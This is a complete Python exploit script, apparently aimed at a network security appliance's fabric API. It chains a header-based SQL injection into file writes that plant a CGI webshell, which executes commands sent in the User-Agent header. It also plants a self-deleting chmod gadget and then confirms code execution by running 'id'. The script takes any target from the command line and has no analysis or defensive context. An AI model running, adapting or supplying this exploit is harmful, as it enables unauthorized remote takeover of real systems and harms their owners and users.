#!/usr/bin/env python3
import argparse
import binascii
from urllib.parse import urljoin

import requests
import urllib3

urllib3.disable_warnings()


class SQLInjection:
    def __init__(self, target: str):
        self._target = target
        self._buggy_api = '/api/fabric/device/status'
        return

    def inject_sql(self, injection: str) -> bool:
        rc = False
        # print(f'injecting :: {injection}')
        headers = {
            "Authorization": f"Bearer ';{injection}"
        }
        dst_url = urljoin(self._target, self._buggy_api)
        try:
            r = requests.get(dst_url, headers=headers, verify=False)
            rc = r.status_code == 401
        except Exception as e:
            rc = False
            print('Sending Request Failed: '+e)

        return rc


class RCE(SQLInjection):
    def __init__(self, target: str):
        super().__init__(target)
        self._target = target
        self._buggy_api = '/api/fabric/device/status'
        self._pyhook_path = '/cgi-bin/ml-draw.py'
        self._chmod_file = ""
        self._chmod_file += "import os # \r\n"
        self._chmod_file += "os.system('chmod +x /migadmin/cgi-bin/x.cgi && rm -f /var/log/lib/python3.10/pylab.py') #"

        self._webshell = ''
        self._webshell += '#!/bin/sh -- \r\n'
        self._webshell += 'printf "Content-Type: text/html\\r\\n";printf "\\r\\n";eval $HTTP_USER_AGENT'
        return

    def upload_webshell(self) -> bool:
        self._reset_tables()
        parts = self._split_payload(self._webshell)
        for part in parts:
            print(f'[*] writing part {part}')
            self.inject_sql(
                f'use/**/fabric_user;update/**/a/**/set/**/a=(select/**/concat(a,0x{binascii.hexlify(part.encode()).decode()})/**/from/**/a);--')

        print('[>] writing webshell file')
        self.inject_sql(
            "select/**/a/**/from/**/fabric_user.a/**/into/**/outfile/**/'/migadmin/cgi-bin/x.cgi'/**/FIELDS/**/ESCAPED/**/BY/**/'';--")

        # init tables
        self._reset_tables()

        # write content
        parts = self._split_payload(self._chmod_file)
        for part in parts:
            print(f'[*] writing part {part}')
            self.inject_sql(
                f'use/**/fabric_user;update/**/a/**/set/**/a=(select/**/concat(a,0x{binascii.hexlify(part.encode()).decode()})/**/from/**/a);--')

        # export content to file
        print('[>] cooking chmod gadget')
        self.inject_sql(
            "select/**/a/**/from/**/fabric_user.a/**/into/**/outfile/**/'/var/log/lib/python3.10/pylab.py'/**/FIELDS/**/ESCAPED/**/BY/**/'")

        print('[*] triggering chmod')
        return self._trigger_chmod()

    def run_cmd(self, cmd: str) -> bytes:
        rc = b''
        dst_url = urljoin(self._target, '/cgi-bin/x.cgi')
        try:
            r = requests.get(dst_url, verify=False,
                             headers={'User-Agent': cmd})
            rc = r.content
        except Exception as e:
            rc = False
            print('Sending Request Failed: '+e)

        return rc

    def _trigger_chmod(self) -> bool:
        rc = False
        dst_url = urljoin(self._target, self._pyhook_path)
        try:
            r = requests.get(dst_url, verify=False)
            rc = r.status_code == 500
        except Exception as e:
            rc = False
            print('Sending Request Failed: '+e)

        return rc

    def _split_payload(self, input_bytes):
        return [input_bytes[i:i+16] for i in range(0, len(input_bytes), 16)]

    def _reset_tables(self):
        self.inject_sql('drop/**/table/**/fabric_user.a;--')
        self.inject_sql('create/**/table/**/fabric_user.a/**/(a/**/TEXT);--')
        self.inject_sql('insert/**/into/**/fabric_user.a/**/values(\'\');--')


def main():
    parser = argparse.ArgumentParser(
        prog='exp.py',
        description='SQLi to RCE primitive',
    )
    parser.add_argument(
        '-t', '--target', help='i.e: https://target-host.com/', required=True)
    args = parser.parse_args()
    target_host = args.target

    pew = RCE(target_host)
    if pew.upload_webshell():
        print('[*] executing `id` ...')
        out = pew.run_cmd('id')
        print(out.decode())
        print('[*] webshell available at: ')
        print(f"   > {urljoin(target_host, '/cgi-bin/x.cgi')}"),
        print('provide command via the `User-Agent` header!)')
    else:
        print('[!] prolly failed :(')

    return


if __name__ == '__main__':
    main()